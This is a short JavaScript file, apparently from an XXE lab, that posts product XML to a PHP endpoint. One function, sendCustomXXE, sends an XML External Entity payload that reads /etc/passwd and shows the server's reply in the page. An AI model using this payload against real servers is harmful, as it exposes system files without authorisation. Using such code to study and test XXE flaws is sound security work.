function sendXML(code) {
    let xml = '';
    if (code === '100') {
        xml = `<products>
            <product>
                <name>Television</name>
                <code>100</code>
                <tags>entertainment</tags>
                <description>This is a pretty cool TV!</description>
            </product>
        </products>`;
    } else if (code === '101') {
        xml = `<products>
            <product>
                <name>Refrigerator</name>
                <code>101</code>
                <tags>appliance</tags>
                <description>Chills your food like a pro.</description>
            </product>
        </products>`;
    }

    sendXMLToServer(xml);
}

function sendCustomXXE() {
    const xxePayload = `<?xml version="1.0"?>
    <!DOCTYPE data [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <products>
        <product>
            <name>&xxe;</name>
            <code>999</code>
            <tags>exploit</tags>
            <description>Exploiting XXE in PHP</description>
        </product>
    </products>`;

    sendXMLToServer(xxePayload);
}

function sendXMLToServer(xml) {
    fetch('detail.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/xml'
        },
        body: xml
    })
    .then(response => response.text())
    .then(html => document.body.innerHTML = html);
}
